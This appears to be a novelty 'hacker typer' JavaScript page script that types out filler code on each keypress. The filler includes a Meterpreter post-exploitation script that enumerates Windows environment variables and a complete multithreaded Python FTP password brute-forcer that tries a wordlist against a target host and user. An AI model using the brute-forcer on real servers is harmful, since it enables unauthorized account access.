// vars
var src, trmnl, line, caret, speed, pos;
trmnl = $('#terminal');
caret = $('#caret');
line = $('#line');
pos = 0;
speed = 4;

// main
$('html').on('keydown', function(e) {
  pos += speed;
  if (pos > src.length + speed - src.length % speed) {
    pos = 0;
  }
  trmnl.html(trmnl.html() + src.slice(pos - speed, pos));
  caret.removeClass('transparent');
  line.css({
    'top': caret.offset().top
  });
  window.scrollTo(0, document.body.scrollHeight);
});

// caret animation
setInterval(function() {
  caret.toggleClass('transparent');
}, 600);

// filler code
src = "# $Id$\r\n# $Revision: $\r\n#Options and Option Parsing\r\nopts = Rex::Parser::Arguments.new(\r\n\t\"-h\" => [ false, \"Help menu.\" ]\r\n)\r\nvar_names = []\r\nvar_names << registry_enumvals(\"HKEY_CURRENT_USER\\\\Volatile Environment\")\r\nvar_names << registry_enumvals(\"HKEY_CURRENT_USER\\\\Environment\")\r\nvar_names << registry_enumvals(\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment\")\r\n\r\ndef list_env_vars(var_names)\r\n\tprint_status(\"Getting all System and User Variables\")\r\n\ttbl = Rex::Ui::Text::Table.new(\r\n\t\t\t\'Header\'  => \"Enviroment Variable list\",\r\n\t\t\t\'Indent\'  => 1,\r\n\t\t\t\'Columns\' =>\r\n\t\t\t\t[\r\n\t\t\t\t\t\"Name\",\r\n\t\t\t\t\t\"Value\"\r\n\t\t\t\t])\r\n\tvar_names.flatten.each do |v|\r\n\t\ttbl << [v,@client.fs.file.expand_path(\"\\%#{v}\\%\")]\r\n\tend\r\n\tprint(\"\\n\" + tbl.to_s + \"\\n\")\r\nend\r\n\r\n\r\nopts.parse(args) { |opt, idx, val|\r\n\tcase opt\r\n\twhen \"-h\"\r\n\t\tprint_line \"Meterpreter Script for extracting a list of all System and User environment variables.\"\r\n\t\tprint_line(opts.usage)\r\n\t\traise Rex::Script::Completed\r\n\r\n\tend\r\n}\r\nif client.platform =~ \/win32|win64\/\r\n\tlist_env_vars(var_names)\r\nelse\r\n\tprint_error(\"This version of Meterpreter is not supported with this Script!\")\r\n\traise Rex::Script::Completed\r\nend\r\ndef print_usage\r\nprint <<USAGE\r\n\r\n  usage: #{$0} \/your\/rails\/app\/path <extensions>\r\n    where <extensions> are comma separated file extensions, e.g. html,js,rb \r\n\r\nUSAGE\r\nexit\r\nend\r\n\r\nprint_usage if ARGV[0] == nil\r\n\r\nclass CommentExtractor\r\n\r\n  def initialize(*args)\r\n    @path = args[0]\r\n    @extensions = args[1] ? args[1].squeeze(\' \').gsub(\'.\', \'\').split(\',\') : %w(css erb feature js haml html rb sass scss)\r\n    @comments = []\r\n    @stats = []\r\n    initialize_comments\r\n    initialize_stats\r\n  end\r\n\r\n  def extract\r\n    Dir.glob(\"#{@path}\/**\/*.{#{@extensions.join(\',\')}}\").each do |f| \r\n      ext = File.extname(f).gsub(\'.\', \'\')\r\n      @stats[@stats.index {|x| x[:extension] == ext}][:files] += 1\r\n      regex = case ext\r\n              when \'html\',\'erb\'; \/\\<!\\s*--(.*?)(--\\s*\\>)\/m\r\n              when \'js\',\'css\',\'scss\'; \/\\\/\\*(.*?)\\*\\\/\/m\r\n              when \'feature\',\'rb\'; \/#.*$\/\r\n              when \'sass\'; \/\\\/\\\/.*$\/\r\n              else; nil\r\n              end\r\n      next if regex.nil?\r\n      res = File.open(f).read.match(regex).to_a\r\n      @stats[@stats.index {|x| x[:extension] == ext}][:comments] += res.size \r\n      res.each do |comment|\r\n        comment_hash = {:file => f, :comment => comment}\r\n        @comments[@comments.index {|x| x[:extension] == ext}][:comments] << comment_hash \r\n      end\r\n    end\r\n  end\r\n\r\n  def print_comments\r\n    res = []\r\n    res << \'\'\r\n    @comments.each do |comment|\r\n      comment[:comments].each do |c|\r\n        res << c[:file]\r\n        res << \'\'\r\n        res << c[:comment]\r\n        res << \'\'\r\n        res << \'---------------------------------------------\'\r\n      end\r\n    end\r\n    res << \'\'\r\n    puts res.join(\"\\n\")\r\n  end\r\n\r\n  def print_stats\r\n    res = []\r\n    res << \'\'\r\n    @stats.each do |stat|\r\n      res << \"  .#{stat[:extension].ljust(7)} #{stat[:files].to_s.rjust(10)} files #{stat[:comments].to_s.rjust(10)} comments\"\r\n    end\r\n    res << \'\'\r\n    puts res.join(\"\\n\")  \r\n  end\r\n\r\nprivate\r\n\r\n  def initialize_comments\r\n    @extensions.each do |ext|\r\n      @comments << {:extension => ext, :comments => []}\r\n    end\r\n  end\r\n\r\n  def initialize_stats\r\n    @extensions.each do |ext|\r\n      @stats << {:extension => ext, :files => 0, :comments => 0}\r\n    end\r\n  end\r\n\r\nend\r\n\r\ndef run\r\n  c = CommentExtractor.new(*ARGV)\r\n  puts \'\'\r\n  puts \'Preparing results...\'\r\n  c.extract\r\n  c.print_comments\r\n  c.print_stats\r\n  puts \'\'\r\nend\r\n\r\nrun if __FILE__ == $PROGRAM_NAME\r\nimport argparse, signal, Queue, time\r\nfrom threading import Thread, Lock\r\nfrom sys import argv, stdout\r\nfrom os import getpid, kill\r\nfrom ftplib import FTP, error_perm\r\n\r\nclass myThread (Thread):\r\n    def __init__(self, threadID, name, q):\r\n        Thread.__init__(self)\r\n        self.threadID = threadID\r\n        self.name = name\r\n        self.q = q\r\n    def run(self):\r\n        ftpcrack(self.name, self.q)\r\n\r\nclass Timer():\r\n\tdef __enter__(self): self.start = time.time()\r\n\tdef __exit__(self, *args):\r\n\t\ttaken = time.time() - self.start\r\n\t\tseconds = int(time.strftime(\'%S\', time.gmtime(taken)))\r\n\t\tminutes = int(time.strftime(\'%M\', time.gmtime(taken)))\r\n\t\thours = int(time.strftime(\'%H\', time.gmtime(taken)))\r\n\t\tif minutes > 0:\r\n\t\t\tif hours > 0:\r\n\t\t\t\tprint \" [*] Time elapsed \" + str(hours) + \" hours, \" + str(minutes) + \" minutes and \" + str(seconds) + \" seconds at \" + str(round(len(passwords) \/ taken,2)) + \" trys per second.\"\r\n\t\t\telse:\r\n\t\t\t\tprint \" [*] Time elapsed \" + str(minutes) + \" minutes and \" + str(seconds) + \" seconds at \" + str(round(len(passwords) \/ taken,2)) + \" trys per second.\"\r\n\t\telse:\r\n\t\t\tprint \" [*] Time elapsed \" + str(seconds) + \" seconds at \" + str(round(len(passwords) \/ taken,2)) + \" trys per second.\"\r\n\r\nclass Printer():\r\n    def __init__(self,data):\r\n        stdout.write(\"\\r\\x1b[K\"+data.__str__())\r\n        stdout.flush()\r\n\r\ndef ftpcrack(threadName, q):\r\n\twhile not exitFlag:\r\n\t\tqueueLock.acquire()\r\n\t\tif not workQueue.empty():\r\n\t\t\tpassword = q.get()\r\n\t\t\tqueueLock.release()\r\n\t\t\tmdone = \"\"\r\n\t\t\twhile not mdone:\r\n\t\t\t\ttry:\r\n\t\t\t\t\tFTP(host, user, password)\r\n\t\t\t\t\tprint(\" [*] Cracked: \" + user + \":\" + password + \"  **-- Successful Login!\")\r\n\t\t\t\t\tcreds = user + \":\" + password\r\n\t\t\t\t\tcracked.append(creds)\r\n\t\t\t\t\tmdone = \"1\"\r\n\t\t\t\texcept error_perm:\r\n\t\t\t\t\tif len(password) < 20:\r\n\t\t\t\t\t\tadd = 20 - int(len(password))\r\n\t\t\t\t\t\tpassword = str(password) + \" \" * add\r\n\t\t\t\t\t\r\n\t\t\t\t\tprogdone = len(passwords) - workQueue.qsize()\r\n\t\t\t\t\tpercent = round(float(100.00) \/ len(passwords) * progdone,2)\r\n\t\t\t\t\ttoken = time.time() - startcnt\r\n\t\t\t\t\teta = round(token \/ progdone * len(passwords) - token,2)\r\n\t\t\t\t\tPrinter(\" [>] \" + str(percent) + \"% Now trying: \" + str(progdone) + \"\/\" + str(len(passwords)) + \" at \" + str(round(progdone \/ token,2)) + \" tries per second    User: \" + user + \" Password: \" + password + \"  -  Unsuccessful Login  ETA: \"  + str(time.strftime(\'%H:%M:%S\', time.gmtime(eta))))\r\n\t\t\t\t\tmdone = \"1\"\r\n\t\t\t\telse:\r\n\t\t\t\t\tpass\r\n\t\telse:\r\n\t\t\tqueueLock.release()\r\n\t\t\t\r\ndef killpid(signum = 0, frame = 0):\r\n\tprint \"\\r\\x1b[K\"\r\n\tkill(getpid(), 9)\r\n\r\nparser = argparse.ArgumentParser(prog=\'ftpcrack\', usage=\'ftpcrack [options]\')\r\nparser.add_argument(\'-t\', \"--threads\", type=int, help=\'number of threads (default: 100)\')\r\nparser.add_argument(\'-i\', \"--ip\", type=str, help=\'host to attack\')\r\nparser.add_argument(\'-u\', \"--user\", type=str, help=\'username to attack\')\r\nparser.add_argument(\'-w\', \"--wordlist\", type=str, help=\'wordlist\')\r\nargs = parser.parse_args()\r\n\r\nprint \'\'\'\r\nHACKED\r\n\'\'\'\r\n\r\nif len(argv) == 1:\r\n\tparser.print_help()\r\n\texit()\r\n\r\nsignal.signal(signal.SIGINT, killpid)\r\nqueueLock = Lock()\r\ncracked = []\r\nthreads = []\r\ncreds = \"\"\r\nexitFlag = 0\r\nthreadID = 1\r\nmaxthreads = 40\r\n\r\nif args.threads:\r\n\tmaxthreads = args.threads\r\n\r\npasswords = [line.strip() for line in open(args.wordlist, \'r\')]\r\nuser = args.user\r\nhost = args.ip\r\n\r\nif not passwords or not user or not host:\r\n\tparser.print_help()\r\n\texit()\r\n\r\ntry:\r\n\tconnection = FTP(host, timeout=2)\r\n\twlcmsg = connection.getwelcome()\r\n\tprint wlcmsg\r\n\tprint\r\nexcept:\r\n\tprint \" [X] Error: it doesn\'t look like \" + str(host) + \" is an FTP server..\"\r\n\tprint\r\n\texit()\r\n\r\nprint \" [*] Loading \" + str(len(passwords)) + \" passwords to try..\"\r\n\r\nworkQueue = Queue.Queue(len(passwords))\r\n\r\nqueueLock.acquire()\r\nfor passw in passwords:\r\n    workQueue.put(passw)\r\nqueueLock.release()\r\n\r\nwhile threadID <= maxthreads:\r\n\ttname = str(\"Thread-\") + str(threadID)\r\n\tthread = myThread(threadID, tname, workQueue)\r\n\tthread.start()\r\n\tthreads.append(thread)\r\n\tthreadID += 1\r\n\r\nstartcnt = time.time()\r\nprint \" [*] Starting attack on \" + str(user) + \"@\" + str(host) + \" with \" + str(maxthreads) + \" threads.\"\r\nprint\r\n\r\nwith Timer():\r\n\twhile not workQueue.empty():\r\n\t\tif cracked:\r\n\t\t\texitFlag = 1\r\n\t\telse:\r\n\t\t\tpass\r\n\r\n\texitFlag = 1\r\n\r\n\tfor t in threads:\r\n\t\tt.join()\r\n\t\r\n\tif cracked:\r\n\t\tprint \"\\r\\x1b[K\\n [*] All threads complete, Cracked!!\"\r\n\telse:\r\n\t\tprint \"\\r\\x1b[K\\n [*] All threads complete, not cracked\"";
